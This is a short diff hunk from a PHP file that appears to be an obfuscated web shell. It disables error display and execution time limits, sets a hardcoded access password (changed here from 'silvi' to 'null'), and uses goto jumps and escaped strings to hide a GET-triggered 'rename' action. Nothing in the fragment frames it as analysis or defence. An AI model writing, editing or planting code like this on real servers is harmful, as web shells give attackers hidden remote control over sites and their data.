@@ -11,7 +11,7 @@ error_reporting(0);
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-$passwd = "silvi";
+$passwd = "null";
 goto E0nyK;
 YJfwp:
 if ($_GET["\x72\145\156\x61\155\x65"] == "\164\x72\x75\x65") {
